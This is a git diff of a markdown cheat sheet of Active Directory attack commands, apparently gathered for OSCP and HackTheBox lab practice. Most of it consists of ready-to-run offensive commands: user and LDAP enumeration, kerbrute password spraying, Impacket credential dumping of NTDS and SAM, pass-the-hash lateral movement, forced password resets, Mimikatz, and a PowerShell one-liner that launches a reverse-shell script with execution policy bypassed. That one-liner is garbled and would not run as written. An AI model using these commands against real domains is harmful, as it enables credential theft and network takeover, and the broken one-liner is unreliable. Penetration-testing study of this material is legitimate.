@@ -11,17 +11,18 @@ Good videos and HTB/Vulnhub boxes to review
 - Active
 - Blackfield
 - Kerbrute
-- Impacket - GetNPUsers.py
-    - rpcclient to set the users password
-    - secretsdump.py - with NTDS
-    - psexec.py
-    - wmiexec.py - (Doesn't drop you to system)
+- Impacket - `GetNPUsers.py`
+    - `rpcclient` to set the users password
+    - `secretsdump.py` - with NTDS
+    - `psexec.py`
+    - `wmiexec.py` - (Doesn't drop you to system)
 
 ### Injecting Kerberos Tickets into Linux
 https://0xeb-bp.com/blog/2019/11/21/practical-guide-pass-the-ticket.html
 
 Sources
-https://musyokaian.medium.com/vulnnet-roasted-tryhackme-walkthrough-a239fb05d032
+- https://musyokaian.medium.com/vulnnet-roasted-tryhackme-walkthrough-a239fb05d032
+- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Active Directory Attack.md#most-common-paths-to-ad-compromise
 
 # AD Enumeration
 This list is far from exhaustive, and a tad bit disorganized, as I collected these commands during my OSCP prep. There is both overlap and some gaps between the commands listed in the XMind content and the content below.
@@ -46,6 +47,7 @@ Rppclient should've been run by autorecon, but just in case
 
 ### LookupSID
 - `lookupsid targetdomain.local/guest@10.10.10.10`
+- `lookupsid.py username:password@172.21.0.0`
 - lots of output, can find usernames by grep -i user
 
 ### Other Impacket Goodies
@@ -65,6 +67,9 @@ Can download file found on smb share with `smbmap -R SHARENAME -H IP.ADDR.0.0 -A
 ### Ldap Enumeration
 - `ldapsearch -x -h 10.10.10.10 -b base namingcontext`
     - if there is an error message of a successful bind must be completed on the connection, then anonymous access to LDAP is disabled
+- Anonymous Credential LDAP Dumping: `ldapsearch -LLL -x -H ldap:// -b ‘’ -s base ‘(objectclass=*)’`
+- `windapsearch`: https://github.com/ropnop/windapsearch
+    - `python3 windapsearch.py -d host.domain -u domain\ldapbind -p PASSWORD -U`
 
 ### Password Crack
 - GPP Decrypt (gpp-decrypt) to decrypt Group Policy Preferences String
@@ -80,7 +85,7 @@ Can download file found on smb share with `smbmap -R SHARENAME -H IP.ADDR.0.0 -A
 - Password Spray with kerbrute: `kerbrute passwordspray -d domain.local -dc 10.10.10.01 formatted_name_wordlist.txt 'Winter2020!'`
 
 ### If you Have Creds
-- `GetADUsers.py (part of impacket) - GetADUsers.py -all active.htb/svc_tgs -dc ip 10.10.10.100`
+- GetADUsers.py (part of impacket) - `GetADUsers.py -all active.htb/svc_tgs -dc ip 10.10.10.100`
 - Impacket PSexec command if you have credentials: `psexec.py active.htb/svc_tgs@10.10.10.100`
 - Revisit `smbmap` with `-u`, `-d`, and `-p` flags
 - `GetUsersSPNs.py - GetUsersSPNs.py -request -dc-ip IP AD active.ht/svc_tgs:pwd`
@@ -95,6 +100,7 @@ Can download file found on smb share with `smbmap -R SHARENAME -H IP.ADDR.0.0 -A
     - `wmiexec domain/username@10.10.10.10`
     - `wmiexec domain/username@10.10.10.10 -hashes`
 - If user is in Admin group, can dump entire SAM database: `secretsdump domain/username@10.10.10.10`
+- `secretdump.py 'breakme.local/Administrator@172.21.0.0' -just-dc-user anakin`
 
 ### If you need Access
 - Have you tried psexec.py with your credentials?
@@ -108,3 +114,17 @@ Can download file found on smb share with `smbmap -R SHARENAME -H IP.ADDR.0.0 -A
 - Make sure to run version 2.1 and newest version
 - `Invoke-Mimikatz`
 - `Invoke-Kerberoast`
+
+
+# Powershell Reference
+Set password of different user:
+- `$pass = ConvertTo-SecureString 'Password' -AsPlainText -Force`
+- `Set-DomainUserPassword Herman -AccountPassword $pass -verbose`
+
+Change domain password:
+- `$pass = ConvertTo-SecureString 'Password' -AsPlainText -Force`
+- `$cred = New-Object System.Management.Automation.PSCredential('Domain\Username', $pass)`
+- `powershell -nop -ep bypass -command `
+
+Powershell One-liner:
+- `p='CrabSharkJellyfish192';$c=convertTo-SecureString -AsPlainText -Force p;p;c=new-object system.management.automation.pscredential(u,u,c);Invoke-Command -ComputerName 127.0.0.1 -Credential $c -ScriptBlock { powershell.exe -nop -ep bypass C:\inetpub\wwwroot\Invoke-PowerShellTcp.ps1 }`
